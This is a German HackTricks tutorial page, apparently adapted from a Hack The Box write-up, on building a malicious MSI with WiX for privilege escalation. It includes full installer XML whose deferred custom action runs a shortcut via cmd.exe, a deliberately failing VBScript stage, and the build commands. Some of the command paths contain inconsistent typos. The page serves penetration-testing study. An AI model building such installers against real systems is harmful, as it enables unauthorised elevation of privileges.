{{#include ../../banners/hacktricks-training.md}}

# Erstellen eines bösartigen MSI und Erlangen von Root

Die Erstellung des MSI-Installers erfolgt mit wixtools, insbesondere wird [wixtools](http://wixtoolset.org) verwendet. Es ist erwähnenswert, dass alternative MSI-Builder ausprobiert wurden, aber in diesem speziellen Fall nicht erfolgreich waren.

Für ein umfassendes Verständnis der Beispiele zur Verwendung von wix MSI ist es ratsam, [diese Seite](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) zu konsultieren. Hier finden Sie verschiedene Beispiele, die die Verwendung von wix MSI demonstrieren.

Ziel ist es, ein MSI zu generieren, das die lnk-Datei ausführt. Um dies zu erreichen, könnte der folgende XML-Code verwendet werden ([xml von hier](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Es ist wichtig zu beachten, dass das Package-Element Attribute wie InstallerVersion und Compressed enthält, die die Version des Installers angeben und angeben, ob das Paket komprimiert ist oder nicht.

Der Erstellungsprozess umfasst die Verwendung von candle.exe, einem Tool von wixtools, um ein wixobject aus msi.xml zu generieren. Der folgende Befehl sollte ausgeführt werden:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Zusätzlich ist es erwähnenswert, dass im Beitrag ein Bild bereitgestellt wird, das den Befehl und seine Ausgabe zeigt. Sie können es als visuelle Anleitung verwenden.

Darüber hinaus wird light.exe, ein weiteres Tool von wixtools, verwendet, um die MSI-Datei aus dem wixobject zu erstellen. Der auszuführende Befehl lautet wie folgt:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Ähnlich wie beim vorherigen Befehl ist ein Bild im Beitrag enthalten, das den Befehl und seine Ausgabe veranschaulicht.

Bitte beachten Sie, dass diese Zusammenfassung wertvolle Informationen bieten soll, es jedoch empfohlen wird, sich auf den ursprünglichen Beitrag zu beziehen, um umfassendere Details und genaue Anweisungen zu erhalten.

## Referenzen

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
